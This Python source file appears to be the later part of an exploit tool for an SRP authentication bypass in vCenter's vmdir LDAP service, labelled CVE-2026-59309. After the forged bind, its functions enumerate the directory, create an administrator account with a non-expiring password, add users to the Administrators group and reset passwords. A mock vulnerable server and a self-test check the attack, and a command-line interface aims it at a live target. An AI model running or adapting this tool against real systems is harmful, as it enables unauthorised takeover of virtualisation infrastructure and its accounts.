# post-bypass actions
# ---------------------------------------------------------------------------
def discover_base(conn: Ldap, log=print) -> list[str]:
    conn.send(op_search("", scope=0, attrs=["namingContexts", "supportedSASLMechanisms"]))
    entries, code = collect_search(conn)
    ncs, mechs = [], []
    for _dn, attrs in entries:
        ncs += attrs.get("namingContexts", [])
        mechs += attrs.get("supportedSASLMechanisms", [])
    if mechs:
        log(f"    SASL mecanismos: {' '.join(mechs)}")
    return ncs or [BASE_DEFAULT]


def probe_pre_auth(conn: Ldap, log=print):
    """Read the rootDSE unauthenticated: confirms the server advertises SRP."""
    try:
        conn.send(op_search("", scope=0,
                            attrs=["supportedSASLMechanisms", "vendorVersion"]))
        entries, _code = collect_search(conn)
    except Exception as exc:  # noqa: BLE001
        log(f"    rootDSE pre-check unavailable ({exc}) -- continuing anyway")
        return None
    mechs: list[str] = []
    vendor = None
    for _dn, attrs in entries:
        mechs += attrs.get("supportedSASLMechanisms", [])
        if not vendor and attrs.get("vendorVersion"):
            vendor = attrs["vendorVersion"][0]
    if vendor:
        log(f"    vendorVersion: {vendor}")
    if mechs:
        log(f"    SASL mecanismos: {' '.join(mechs)}")
        # some servers return "GSSAPI SRP" in a single string
        tokens = {t.upper() for m in mechs for t in m.replace(',', ' ').split()}
        if "SRP" not in tokens:
            log("    warning: SRP not advertised -- this bypass probably does not apply")
    else:
        log("    rootDSE did not list SASL mechanisms (anonymous bind may be blocked)")
    return mechs


def enumerate_admins(conn: Ldap, base: str, log=print):
    """Read the directory with a SINGLE broad search.

    The real vmdird processes only the first wrapped PDU of each session:
    from the second one on, the MAC it expects does not follow the cyrus
    convention and the connection drops (behaviour observed on 8.0.3
    build-24322831). That is why enumeration issues a single broad search
    instead of one per object class -- the server returns every match in a
    single response.
    """
    attrs = ["cn", "sAMAccountName", "userPrincipalName", "objectClass",
             "member", "userAccountControl"]
    conn.send(op_search(base, scope=2, flt="(objectClass=*)", attrs=attrs))
    entries, code = collect_search(conn)
    if code not in (0, None):
        log(f"    search -> code={code}")
    users, groups, other = [], [], []
    for dn, a in entries:
        oc = [x.lower() for x in (a.get("objectClass") or [])]
        if "group" in oc:
            groups.append((dn, a))
        elif "user" in oc or "person" in oc:
            users.append((dn, a))
        else:
            other.append((dn, a))
    log(f"    {len(entries)} objects read: {len(users)} users, "
        f"{len(groups)} groups, {len(other)} others")
    for dn, a in sorted(users)[:200]:
        upn = (a.get("userPrincipalName") or [""])[0]
        sam = (a.get("sAMAccountName") or [""])[0]
        log(f"    user  {dn}  sam={sam} upn={upn}")
    for dn, a in sorted(groups)[:200]:
        log(f"    group {dn}  ({len(a.get('member') or [])} members)")
    return {dn: a for dn, a in entries}


GROUP_DEFAULT = "cn=Administrators,cn=Builtin,{base}"
# vmdir rejects a UPN outside this domain (code=21 "Invalid userPrincipalName")
UPN_DOMAIN = "VSPHERE.LOCAL"


def user_dn(user: str, base: str) -> str:
    return user if user.lower().startswith("cn=") else f"cn={user},cn=Users,{base}"


def domain_name(base: str) -> str:
    """dc=vsphere,dc=local -> vsphere.local (used in sn and in the UPN suffix)."""
    return ".".join(p.split("=", 1)[1] for p in base.split(",")
                    if p.lower().startswith("dc="))


def create_admin(conn: Ldap, base: str, user: str, password: str, log=print) -> bool:
    """Create the account with a SINGLE PDU (add) -- the vmdird per-session limit.

    vmdir validates the userPrincipalName on add and returns code=21 even
    with the correct suffix; the SAME value is accepted through modify. So
    the add creates the entry without a UPN and set_upn (new session)
    completes it; group membership follows, also in a new session.
    """
    dn = user_dn(user, base)
    # shape of the real entries (cn=Administrator): class "user" present and
    # sn equal to the directory domain
    attrs = [
        ("objectClass", ["top", "person", "organizationalPerson", "user"]),
        ("cn", [user]), ("givenName", [user]),
        ("sn", [domain_name(base)]),
        ("sAMAccountName", [user]),
        ("userPassword", [password]),
        ("vmwPasswordNeverExpires", ["TRUE"]),
    ]
    conn.send(op_add(dn, attrs))
    _, tag, val = conn.recv()
    code, diag = parse_result(val)
    log(f"    add {dn} -> code={code} {diag}")
    if code == 0:
        log("    account created; UPN and group membership still missing")
    return code == 0


def set_upn(conn: Ldap, base: str, user: str, log=print) -> bool:
    """Set the userPrincipalName (add refuses it with code=21, modify accepts)."""
    dn = user_dn(user, base)
    conn.send(op_modify(dn, [(2, "userPrincipalName",
                              [f"{user}@{UPN_DOMAIN}"])]))
    _, tag, val = conn.recv()
    code, diag = parse_result(val)
    log(f"    userPrincipalName {user}@{UPN_DOMAIN} -> code={code} {diag}")
    return code == 0


def add_group_member(conn: Ldap, group_dn: str, dn: str, log=print) -> bool:
    """Add an existing member to the group, also in a SINGLE PDU."""
    conn.send(op_modify(group_dn, [(0, "member", [dn])]))
    _, tag, val = conn.recv()
    code, diag = parse_result(val)
    log(f"    add membro {dn} em {group_dn} -> code={code} {diag}")
    return code == 0


def reset_password(conn: Ldap, base: str, user: str, password: str, log=print) -> bool:
    dn = user_dn(user, base)
    conn.send(op_modify(dn, [(2, "userPassword", [password])]))
    _, tag, val = conn.recv()
    code, diag = parse_result(val)
    log(f"    replace userPassword on {dn} -> code={code} {diag}")
    return code == 0


# ---------------------------------------------------------------------------
# target version (unauthenticated)
# ---------------------------------------------------------------------------
def target_version(host, port=443, timeout=10):
    import urllib.request
    body = ('<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.'
            'xmlsoap.org/soap/envelope/"><soapenv:Body><RetrieveServiceContent '
            'xmlns="urn:vim25"><_this type="ServiceInstance">ServiceInstance'
            '</_this></RetrieveServiceContent></soapenv:Body></soapenv:Envelope>')
    req = urllib.request.Request(
        f"https://{host}:{port}/sdk", data=body.encode(),
        headers={"Content-Type": "text/xml", "SOAPAction": "urn:vim25/RetrieveServiceContent"},
        method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout,
                                    context=ssl._create_unverified_context()) as r:
            xml = r.read().decode("utf-8", "replace")
    except Exception:  # noqa: BLE001
        return None
    import re
    out = {}
    for f in ("fullName", "version", "build"):
        m = re.search(rf"<{f}[^>]*>(.*?)</{f}>", xml, re.S)
        out[f] = m.group(1).strip() if m else None
    return out or None


# ---------------------------------------------------------------------------
# test SRP server (validates the client math)
# ---------------------------------------------------------------------------
class MockVmdir:
    """Fake vmdird: implements SRP-6 and, optionally, the missing check."""

    def __init__(self, patched=False, identity=IDENT_DEFAULT, password="change-me-test-password",
                 moot=True, layer_ack=True):
        self.patched = patched
        self.moot = moot          # like the real vmdird: 14 + creds, success only on ack
        # layer_ack=True: the final ack comes wrapped by the layer (the
        # "wrapped" variant); False: it comes cleartext, as the cyrus client sends
        self.layer_ack = layer_ack
        self._plain_read = False
        self.identity = identity.encode()
        self.salt = secrets.token_bytes(8)
        H = lambda b: hashlib.sha1(b).digest()  # noqa: E731
        x = int.from_bytes(H(self.salt + H(f"{identity}:{password}".encode())), "big")
        self.v = pow(G_1024, x, N_1024)
        self.b = int.from_bytes(secrets.token_bytes(32), "big")
        B = (3 * self.v + pow(G_1024, self.b, N_1024)) % N_1024
        self.B = B
        self.M1_expected = None
        self.hits: list[str] = []
        self._srv = None
        self.last_opts = None
        self.layer = None
        self._plain = b""
        self.acked = False

    L_STRING = ("mda=SHA-1,replay_detection,integrity=HMAC-SHA-1,"
                "integrity=HMAC-RIPEMD-160,integrity=HMAC-MD5,"
                "confidentiality=AES,confidentiality=Blowfish,"
                "confidentiality=CAST-128,confidentiality=IDEA,"
                "maxbuffersize=1048575,mandatory=replay_detection,"
                "mandatory=integrity,mandatory=confidentiality")

    def _challenge(self):
        L = self.L_STRING
        body = (f_m(N_1024) + f_m(G_1024) + f_o(self.salt) + f_m(self.B) +
                f_s(L.encode()))
        return b"\x00" + body          # prefixo 0x00 + frame

    def handle(self, sock: socket.socket):
        # accepts a pre-authentication search (rootDSE) before the bind
        while True:
            msgid, tag, val = self._read(sock)
            if tag != 0x63:
                break
            self._send_entry(sock, msgid)
            self._send(sock, msgid, tlv(0x65, ber_enum(0) + ber_str(b"") + ber_str(b"")))
        code, creds = self._bind_fields(val)
        payload = _strip_prefix(creds)
        off = 0
        _u, off = _rd_s(payload, off)
        _i, off = _rd_s(payload, off)
        sid, off = _rd_s(payload, off)
        _cn, off = _rd_os(payload, off)
        self._send(sock, msgid + 1, self._bind_result(14, self._challenge(), 0x87))

        msgid, tag, val = self._read(sock)
        code, creds = self._bind_fields(val)
        payload = _strip_prefix(creds)
        off = 0
        A, off = _rd_mpi(payload, off)
        M1, off = _rd_os(payload, off)
        opts, off = _rd_s(payload, off)
        cIV, off = _rd_os(payload, off)
        self.last_opts = opts

        if self.patched and A % N_1024 == 0:
            self._send(sock, msgid + 1, self._bind_result(2, b"", 0))
            return

        # like the real vmdird: refuses step 2 without the mandatory components
        have = {p.strip().lower() for p in re.split(rb"[,\s]+", opts) if p.strip()}
        need = (b"integrity", b"confidentiality", b"replay_detection")
        if not all(any(h.startswith(nd) for h in have) for nd in need):
            self._send(sock, msgid + 1,
                       self._bind_result(1, b"", 0, b"SASL step failed"))
            return

        u = int.from_bytes(hashlib.sha1(i2b(A) + i2b(self.B)).digest(), "big")
        S = pow((A * pow(self.v, u, N_1024)) % N_1024, self.b, N_1024)
        K = hashlib.sha1(i2b(S)).digest()
        H = lambda b: hashlib.sha1(b).digest()  # noqa: E731
        Ng = bytes(a ^ b for a, b in zip(H(i2b(N_1024)), H(i2b(G_1024))))
        L_raw = self.L_STRING.encode()
        expect = H(Ng + H(self.identity) + self.salt + i2b(A) + i2b(self.B) + K +
                   H(self.identity) + H(L_raw))
        if expect != M1:
            self._send(sock, msgid + 1, self._bind_result(49, b"", 0))
            return
        self.M1_expected = M1

        sIV = secrets.token_bytes(16)
        ttl = 3600
        M2 = hashlib.sha1(i2b(A) + M1 + K + H(self.identity) + H(opts) + sid +
                          ttl.to_bytes(4, "big")).digest()
        final = f_o(M2) + f_o(sIV) + f_s(sid) + ttl.to_bytes(4, "big")
        # this response still goes cleartext; the layer turns on after it
        self._send(sock, msgid + 1,
                   self._bind_result(14 if self.moot else 0, final, 0x87))
        # server LayerInit: enc_IV=cIV (the client one), dec_IV=sIV
        self.layer = SrpLayer(K, integ="HMAC-SHA-1", conf="AES",
                              enc_iv=cIV, dec_iv=sIV, mac_over="cipher")
        self._plain = b""
        if self.moot:
            # second leg: only closes with the client ack
            self._plain_read = not self.layer_ack
            try:
                self._read(sock)
            except Exception:         # noqa: BLE001
                return
            finally:
                self._plain_read = False
            self.acked = True
            self._send(sock, msgid + 2, self._bind_result(0, b"", 0),
                       wrap=self.layer_ack)
        self._serve_ldap(sock)

    def _serve_ldap(self, sock):
        while True:
            try:
                msgid, tag, val = self._read(sock)
            except Exception:  # noqa: BLE001
                return
            if tag == 0x42:            # unbind
                return
            if tag == 0x63:            # search
                kids = children(val)
                base = kids[0][1].decode()
                scope = int.from_bytes(kids[1][1], "big")
                self._send_entry(sock, msgid)
                self._send(sock, msgid, tlv(0x65, ber_enum(0) + ber_str(b"") + ber_str(b"")))
            elif tag == 0x68:          # add
                dn = children(val)[0][1].decode()
                self.hits.append("add:" + dn)
                self._send(sock, msgid, tlv(0x69, ber_enum(0) + ber_str(b"") + ber_str(b"")))
            elif tag == 0x66:          # modify
                dn = children(val)[0][1].decode()
                self.hits.append("modify:" + dn)
                self._send(sock, msgid, tlv(0x67, ber_enum(0) + ber_str(b"") + ber_str(b"")))
            elif tag == 0x4A:          # delete
                self.hits.append("delete")
                self._send(sock, msgid, tlv(0x6B, ber_enum(0) + ber_str(b"") + ber_str(b"")))
            else:
                return

    def _send_entry(self, sock, msgid):
        attrs = [("namingContexts", [b"dc=vsphere,dc=local"]),
                 ("supportedSASLMechanisms", [b"SRP"])]
        partial = b"".join(
            tlv(0x30, ber_str(n) + tlv(0x31, b"".join(ber_str(v) for v in vs)))
            for n, vs in attrs)
        entry = tlv(0x64, ber_str(b"") + tlv(0x30, partial))
        tlv_body = tlv(0x30, ber_int(msgid) + entry)
        sock.sendall(self.layer.wrap(tlv_body) if self.layer else tlv_body)

    def _bind_result(self, code, creds, creds_tag, diag=b""):
        body = ber_enum(code) + ber_str(b"") + ber_str(diag)
        if creds_tag:
            body += tlv(creds_tag, creds)
        return tlv(0x61, body)

    def _bind_fields(self, val):
        code, creds = 0, None
        for tag, v in children(val):
            if tag == 0x0A:
                code = int.from_bytes(v, "big")
            elif tag == 0xA3:
                for t2, v2 in children(v):
                    if t2 == 0x04:
                        creds = v2
        return code, creds

    def _take(self, sock, n):
        while len(self._plain) < n:
            chunk = sock.recv(65536)
            if not chunk:
                raise ConnectionError("eof")
            if self.layer is not None and not self._plain_read:
                self._plain += self.layer.unwrap(chunk)
            else:
                self._plain += chunk
        out, self._plain = self._plain[:n], self._plain[n:]
        return out

    def _read(self, sock):
        head = self._take(sock, 2)
        n = head[1]
        if n & 0x80:
            n = int.from_bytes(self._take(sock, n & 0x7F), "big")
        val = self._take(sock, n)
        kids = children(val)
        return int.from_bytes(kids[0][1], "big"), kids[1][0], kids[1][1]

    def _send(self, sock, msgid, op, wrap=True):
        data = tlv(0x30, ber_int(msgid) + op)
        use_layer = wrap and self.layer is not None
        sock.sendall(self.layer.wrap(data) if use_layer else data)

    def serve_in_thread(self):
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", 0))
        srv.listen(5)
        port = srv.getsockname()[1]

        def loop():
            while True:
                try:
                    client, _ = srv.accept()
                except OSError:
                    return
                try:
                    self.handle(client)
                except Exception:  # noqa: BLE001
                    pass
                finally:
                    client.close()

        threading.Thread(target=loop, daemon=True).start()
        return srv, port


# ---------------------------------------------------------------------------
# offline layer analysis (--capture / --analyze)
# ---------------------------------------------------------------------------
_MAC_LAYOUTS = [
    ("ct|seq", lambda ct, seq: ct + seq.to_bytes(4, "big")),
    ("seq|ct", lambda ct, seq: seq.to_bytes(4, "big") + ct),
    ("ct", lambda ct, seq: ct),
    ("len4|ct|seq", lambda ct, seq:
     len(ct).to_bytes(4, "big") + ct + seq.to_bytes(4, "big")),
    ("len4|ct", lambda ct, seq: len(ct).to_bytes(4, "big") + ct),
    ("ct|seq_le", lambda ct, seq: ct + seq.to_bytes(4, "little")),
]

_MAC_KEYS = [
    ("K", lambda K: K),
    ("K[:16]", lambda K: K[:16]),
    ("sha1(K)", lambda K: hashlib.sha1(K).digest()),
]


def _split_records(stream: bytes):
    """Find where the records start and return (offset, [records])."""
    best = (0, [])
    for off in range(0, min(len(stream), 96)):
        recs, pos = [], off
        while pos + 4 <= len(stream):
            total = int.from_bytes(stream[pos:pos + 4], "big")
            if total <= 20 or total > 65535 or pos + 4 + total > len(stream):
                break
            recs.append(stream[pos:pos + 4 + total])
            pos += 4 + total
        if len(recs) > len(best[1]):
            best = (off, recs)
    return best


def analyze_capture(path: str, out=print) -> int:
    """Infer the real layer convention from the wire recorded by --capture.

    Nothing here touches the network: the layer key in the bypass is public
    (K = SHA1(b"")), so every record MAC can be recomputed offline. The
    convention that verifies all MACs is the one the server uses.
    """
    try:
        with open(path, encoding="utf-8") as fh:
            events = [json.loads(ln) for ln in fh if ln.strip()]
    except (OSError, ValueError) as exc:
        out(f"[-] could not read {path}: {exc}")
        return 1

    sessions, cur = [], None
    for ev in events:
        if ev.get("ev") == "session":
            cur = {"meta": ev, "layer": None, "in": [], "out": []}
            sessions.append(cur)
            continue
        if cur is None:
            cur = {"meta": {}, "layer": None, "in": [], "out": []}
            sessions.append(cur)
        if ev.get("ev") == "layer":
            cur["layer"] = ev
        elif ev.get("ev") == "io" and ev.get("layer"):
            cur[ev["dir"]].append(bytes.fromhex(ev["hex"]))

    best = None
    for s in sessions:
        if not s["layer"] or not s["in"]:
            continue
        stream = b"".join(s["in"])
        off, recs = _split_records(stream)
        if recs and (best is None or len(recs) > len(best[1][1])):
            best = (s, (off, recs))
    if best is None:
        out("[-] no session with a layer and inbound traffic in the capture")
        return 1

    s, (off, recs) = best
    lay = s["layer"]
    K = bytes.fromhex(lay["K"])
    out(f"[*] session: mac={s['meta'].get('mac')} seq0={s['meta'].get('seq')} "
        f"ack={s['meta'].get('ack')} | layer: integ={lay['integ']} "
        f"conf={lay['conf']} mac={lay['mac']} pad={lay['pad']}")
    out(f"[*] {len(recs)} incoming record(s) starting at byte {off} "
        f"({sum(len(r) for r in recs)} bytes)")

    seen = {}
    for idx, rec in enumerate(recs):
        total = int.from_bytes(rec[:4], "big")
        ct, mac = rec[4:4 + total - 20], rec[4 + total - 20:]
        hits = []
        for kname, kf in _MAC_KEYS:
            key = kf(K)
            for lname, lf in _MAC_LAYOUTS:
                for seq in range(0, 17):
                    cand = hmac.new(key, lf(ct, seq), hashlib.sha1).digest()
                    if hmac.compare_digest(cand, mac):
                        hits.append((kname, lname, seq))
        out(f"    #{idx}: len={total} ct={len(ct)}B -> {len(hits)} hypothesis(es)")
        for h in hits[:6]:
            out(f"         key={h[0]:<8} msg={h[1]:<12} seq={h[2]}")
        for h in hits:
            seen.setdefault((h[0], h[1]), []).append((idx, h[2]))

    if not seen:
        out("[-] no MAC verifies with K = SHA1(b''): either the server does "
            "not use the srp.c layer, or these bytes are not wrapped")
        return 1

    complete = [(k, l, v) for (k, l), v in seen.items() if len(v) == len(recs)]
    out("")
    if complete:
        for k, l, v in complete:
            seqs = [x[1] for x in v]
            steps = sorted({b - a for a, b in zip(seqs, seqs[1:])})
            out(f"[+] convention that explains everything: key={k} msg={l} "
                f"seqs={seqs} step={steps or 'single'}")
    else:
        partial = [f"{k}/{l}:{len(v)}/{len(recs)}" for (k, l), v in seen.items()]
        out(f"[!] no convention explains every record; partial={partial}")

    cIV = bytes.fromhex(lay["dec_iv"])
    sIV = bytes.fromhex(lay["enc_iv"])
    out("")
    for kname, key in (("K[:16]", K[:16]),
                       ("sha1(K)[:16]", hashlib.sha1(K).digest()[:16])):
        for ivname, iv in (("dec_iv(cIV)", cIV), ("enc_iv(sIV)", sIV)):
            aes = AesOfb(key, iv)
            plains = []
            for rec in recs:
                total = int.from_bytes(rec[:4], "big")
                plains.append(aes.apply(rec[4:4 + total - 20]))
            if not plains or plains[0][:1] != b"\x30":
                continue
            try:
                tag, val, _ = parse_tlv(plains[0])
                ok = tag == 0x30 and len(children(val)) >= 2
            except (ValueError, IndexError):
                ok = False
            if ok:
                out(f"[+] valid decryption: key={kname} iv={ivname} "
                    f"pdu={plains[0][:24].hex()}")
            else:
                out(f"[?] key={kname} iv={ivname}: starts with 30 but does not "
                    f"parse ({plains[0][:16].hex()})")
    return 0


def self_test() -> int:
    fails = 0

    def check(label, cond, detail=""):
        nonlocal fails
        print(f"  {'ok  ' if cond else 'FAIL'} {label} {'' if cond else detail}")
        fails += 0 if cond else 1

    print("[1] BER")
    check("short len", ber_len(5) == b"\x05")
    check("long len", ber_len(200) == b"\x81\xc8")
    check("roundtrip tlv", parse_tlv(tlv(0x04, b"abc"))[:2] == (0x04, b"abc"))

    print("\n[2] SRP fields")
    check("mpi", f_m(0x1234) == b"\x00\x02\x12\x34", f_m(0x1234))
    check("os", f_o(b"ab") == b"\x02ab")
    check("utf8", f_s("ab") == b"\x00\x02ab")
    check("frame", f_frame(b"xy") == b"\x00\x00\x00\x02xy")

    print("\n[2b] AES-128 / OFB / SASL layer")
    key = bytes(range(16))
    pt = bytes.fromhex("00112233445566778899aabbccddeeff")
    ct = _aes_encrypt_block(_aes_keys(key), pt)
    check("FIPS-197 vector", ct.hex() == "69c4e0d86a7b0430d8cdb78070b4c55a", ct.hex())
    iv = bytes.fromhex("0f0e0d0c0b0a09080706050403020100")
    data = b"test LDAP record" * 3
    enc = AesOfb(key, iv).apply(data)
    check("OFB roundtrip", AesOfb(key, iv).apply(enc) == data)
    check("OFB ciphertext differs", enc != data)

    K = b"K" * 20
    a_lay = SrpLayer(K, integ="HMAC-SHA-1", conf="AES", enc_iv=iv,
                     dec_iv=b"\x02" * 16, mac_over="cipher")
    b_lay = SrpLayer(K, integ="HMAC-SHA-1", conf="AES", enc_iv=b"\x02" * 16,
                     dec_iv=iv, mac_over="cipher")
    wire = a_lay.wrap(b"hello") + a_lay.wrap(b" world")
    check("layer wrap/unwrap", b_lay.unwrap(wire) == b"hello world")
    # 4B length + plaintext (OFB does not change the size) + 20B HMAC
    check("record = len|ct|mac", len(wire) == (4 + 5 + 20) + (4 + 6 + 20), len(wire))

    # wire format checked by hand, without relying on SrpLayer itself
    ct = AesOfb(K[:16], iv).apply(b"hello")
    want = ((len(ct) + 20).to_bytes(4, "big") + ct +
            hmac.new(K, ct + (0).to_bytes(4, "big"), hashlib.sha1).digest())
    fresh = SrpLayer(K, integ="HMAC-SHA-1", conf="AES", enc_iv=iv,
                     dec_iv=b"\x02" * 16, mac_over="cipher")
    got = fresh.wrap(b"hello")
    check("wire bytes match srp_encode()", got == want, got.hex())

    # HMAC variant over the plaintext (fallback for stacks that use it)
    plain_lay = SrpLayer(K, integ="HMAC-SHA-1", conf="AES", enc_iv=iv,
                         dec_iv=b"\x02" * 16, mac_over="plain")
    peer_lay = SrpLayer(K, integ="HMAC-SHA-1", conf="AES", enc_iv=b"\x02" * 16,
                        dec_iv=iv, mac_over="plain")
    check("mac=plain variant",
          peer_lay.unwrap(plain_lay.wrap(b"abc")) == b"abc")

    # variant with padding (for stacks that encrypt with EVP in a block mode)
    pad_a = SrpLayer(K, integ="HMAC-SHA-1", conf="AES", enc_iv=iv,
                     dec_iv=b"\x04" * 16, pad=True)
    pad_b = SrpLayer(K, integ="HMAC-SHA-1", conf="AES", enc_iv=b"\x04" * 16,
                     dec_iv=iv, pad=True)
    check("pad=1 variant", pad_b.unwrap(pad_a.wrap(b"abc")) == b"abc")

    cli, sel = negotiate_options(MockVmdir.L_STRING)
    check("negotiation covers mandatory",
          "integrity=HMAC-SHA-1" in cli and "confidentiality=AES" in cli
          and "replay_detection" in cli, cli)
    check("negotiation detects maxbuf", sel["maxbuf"] == 1048575, sel["maxbuf"])
    cli2, _ = negotiate_options("mda=SHA-1")
    check("negotiation without mandatory", cli2 == "mda=SHA-1", cli2)

    # layouts of the final credentials (the real vmdird sends 44B)
    m2, sIV, sid, ttl = bytes(20), bytes(range(16)), bytes(4), 3600
    os_body = f_o(m2) + f_o(sIV) + f_s(sid) + ttl.to_bytes(4, "big")
    raw_body = m2 + sIV + sid + ttl.to_bytes(4, "big")
    check("layout os recognized",
          any(c["layout"] == "os" and c["sIV"] == sIV for c in _parse_finals(os_body)))
    check("layout raw recognized",
          any(c["layout"] == "raw" and c["sIV"] == sIV for c in _parse_finals(raw_body)))
    check("4B frame removed during parse",
          any(c["layout"] == "os" for c in _parse_finals(f_frame(os_body))))

    print("\n[3] bypass against the simulated vmdird (vulnerable)")
    mock = MockVmdir(patched=False)
    srv, port = mock.serve_in_thread()
    try:
        conn = Ldap("127.0.0.1", port, use_tls=False, timeout=10)
        ok, msg, info = srp_bypass(conn, IDENT_DEFAULT, ack_mode="wrapped",
                                   log=lambda s: None)
        check("bind succeeded", ok, msg)
        check("final ack accepted (moot flow)", mock.acked is True)
        check("forged M1 accepted by the server", mock.M1_expected is not None)
        check("N=1024 bits", info.get("N_bits") == 1024, info.get("N_bits"))

        ncs = discover_base(conn, log=lambda s: None)
        check("rootDSE namingContexts", ncs == ["dc=vsphere,dc=local"], ncs)
        ok_add = create_admin(conn, "dc=vsphere,dc=local", "pocadmin", "self-test-password",
                              log=lambda s: None)
        check("admin created over LDAP after the bypass", ok_add)
        check("server recorded the add",
              any(h.startswith("add:cn=pocadmin") for h in mock.hits), mock.hits)
        conn.close()
    finally:
        srv.close()

    print("\n[3b] cleartext final ack (cyrus client flow)")
    mock = MockVmdir(patched=False, layer_ack=False)
    srv, port = mock.serve_in_thread()
    try:
        conn = Ldap("127.0.0.1", port, use_tls=False, timeout=10)
        ok, msg, info = srp_bypass(conn, IDENT_DEFAULT, log=lambda s: None)
        check("bind with cleartext ack", ok and mock.acked, msg)
        check("default ack is also cleartext", info.get("ack") == "empty", info.get("ack"))
        ncs = discover_base(conn, log=lambda s: None)
        check("post-bind search through the layer", ncs == ["dc=vsphere,dc=local"], ncs)
        conn.close()
    finally:
        srv.close()

    print("\n[4] patched target (A mod N validation)")
    mock = MockVmdir(patched=True)
    srv, port = mock.serve_in_thread()
    try:
        conn = Ldap("127.0.0.1", port, use_tls=False, timeout=10)
        ok, msg, _ = srp_bypass(conn, IDENT_DEFAULT, log=lambda s: None)
        check("bypass refused", not ok, msg)
        check("message indicates patch", "PATCHED" in msg or "refused" in msg, msg)
        conn.close()
    finally:
        srv.close()

    print("\n[5] non-existent identity (no verifier)")
    class NoSecret(MockVmdir):
        """vmdird that cannot find the identity SRP verifier (like the real one)."""

        def handle(self, sock):
            msgid, _tag, _val = self._read(sock)
            body = ber_enum(49) + ber_str(b"") + ber_str(b"no secret in database")
            self._send(sock, msgid, tlv(0x61, body))

    m2 = NoSecret()
    srv, port = m2.serve_in_thread()
    try:
        conn = Ldap("127.0.0.1", port, use_tls=False, timeout=10)
        ok, msg, _ = srp_bypass(conn, "doesnotexist@vsphere.local", log=lambda s: None)
        check("failure handled", not ok, msg)
        conn.close()
    finally:
        srv.close()

    print("\n[6] out-of-pattern sequence (vmdird case) and --analyze")
    Kb = hashlib.sha1(b"").digest()
    iv = bytes(range(16))
    srv_lay = SrpLayer(Kb, "HMAC-SHA-1", "AES", enc_iv=iv, seq_base=1)
    cli_lay = SrpLayer(Kb, "HMAC-SHA-1", "AES", dec_iv=iv, seq_base=0, seq_auto=True)
    heard = []
    cli_lay.log = heard.append
    p1 = tlv(0x30, ber_int(2) + ber_enum(0) + ber_str(b"") + ber_str(b""))
    p2 = tlv(0x30, ber_int(3) + tlv(0x65, ber_enum(0) + ber_str(b"") + ber_str(b"")))
    w1, w2 = srv_lay.wrap(p1), srv_lay.wrap(p2)
    got = cli_lay.unwrap(w1 + w2)          # both records in a single segment
    check("first record with shifted seq", got == p1 + p2, got[:16].hex())
    check("seq_in advanced to 3", cli_lay.seq_in == 3, cli_lay.seq_in)
    check("shift recorded in the log", any("seq_in" in s for s in heard), heard[:1])

    rigido = SrpLayer(Kb, "HMAC-SHA-1", "AES", dec_iv=iv, seq_base=0, seq_auto=False)
    try:
        rigido.unwrap(w1)
        check("without seq_auto fails as before", False, "did not fail")
    except ValueError as exc:
        check("without seq_auto fails as before", "MAC mismatch" in str(exc), str(exc)[:60])

    import tempfile
    with tempfile.TemporaryDirectory() as td:
        path = os.path.join(td, "cap.jsonl")
        rig = SrpLayer(Kb, "HMAC-SHA-1", "AES", enc_iv=iv, seq_base=1)
        evs = [{"ev": "session", "target": "simulado", "port": 389,
                "mac": "cipher", "seq": 1, "pad": 0, "ack": "m2"},
               {"ev": "layer", "K": Kb.hex(), "enc_iv": bytes(16).hex(),
                "dec_iv": iv.hex(), "integ": "HMAC-SHA-1", "conf": "AES",
                "mac": "cipher", "pad": 0}]
        for pdu in (p1, p2):
            evs.append({"ev": "io", "dir": "in", "layer": True,
                        "hex": rig.wrap(pdu).hex()})
        with open(path, "w", encoding="utf-8") as fh:
            for ev in evs:
                fh.write(json.dumps(ev) + "\n")
        lines_out = []
        rc = analyze_capture(path, out=lines_out.append)
        txt = "\n".join(lines_out)
        check("analyze pins down the convention", rc == 0 and "key=K msg=ct|seq" in txt,
              txt[-120:])
        check("analyze sees the real sequence", "seqs=[1, 2]" in txt, txt[-120:])
        check("analyze decrypts the PDU", "valid decryption" in txt, txt[-120:])

    print()
    print("self-test OK" if not fails else f"self-test: {fails} failure(s)")
    return 0 if not fails else 1


def main() -> int:
    p = argparse.ArgumentParser(description="CVE-2026-59309 - vCenter vmdir SRP auth bypass")
    p.add_argument("-t", "--target")
    p.add_argument("--port", type=int, help="389 (cleartext) or 636 (TLS). default: 636 when --tls")
    p.add_argument("--tls", action="store_true", help="use LDAPS")
    p.add_argument("--identity", default=IDENT_DEFAULT, help="identity to impersonate")
    p.add_argument("--base", default=None,
                   help=f"base DN (default: {BASE_DEFAULT} for actions, rootDSE for --check)")
    p.add_argument("--check", action="store_true", help="bind + rootDSE only (read-only)")
    p.add_argument("--enum", action="store_true", help="list users/groups")
    p.add_argument("--create-admin", action="store_true", help="create a user in Administrators")
    p.add_argument("--new-user", default=None)
    p.add_argument("--new-pass", default=None)
    p.add_argument("--reset-pass", metavar="USER", help="replace userPassword")
    p.add_argument("--group-add", metavar="USER",
                   help="bind an existing user to the administrative group "
                        "(own session: 1 PDU)")
    p.add_argument("--group-dn", default=None,
                   help=f"group DN (default: {GROUP_DEFAULT}); {{base}} is "
                        "replaced by the base DN")
    p.add_argument("--debug", action="store_true", help="hexdump of the LDAP traffic")
    p.add_argument("--mac", choices=["auto", "plain", "cipher"], default="auto",
                   help="HMAC convention of the layer (default: auto = cipher, "
                        "as in cyrus-sasl, then the variants)")
    p.add_argument("--seq", type=int, default=None,
                   help="starting sequence of the records (default: 0, then 1)")
    p.add_argument("--pad", type=int, choices=[0, 1], default=0,
                   help="force PKCS#7 padding before AES (default: 0, the "
                        "aes-128-ofb of cyrus uses no padding)")
    p.add_argument("--ack", choices=["empty", "m2", "wrapped", "wrapped-m2"],
                   default=None,
                   help="final csrp ack: cleartext (default: empty, then m2) "
                        "or inside the layer (wrapped, wrapped-m2)")
    p.add_argument("--capture", metavar="FILE",
                   help="record the binary session traffic (jsonl) for --analyze")
    p.add_argument("--analyze", metavar="FILE",
                   help="attacks nothing: infers the layer convention from a capture")
    p.add_argument("--no-seq-auto", action="store_true",
                   help="do not auto-adjust the sequence of incoming records")
    p.add_argument("--mac-in", choices=["strict", "warn", "off"], default="strict",
                   help="MAC validation of SERVER records: strict (drops "
                        "the session), warn (warn and continue, decryption stays "
                        "valid) or off (no validation)")
    p.add_argument("--self-test", action="store_true")
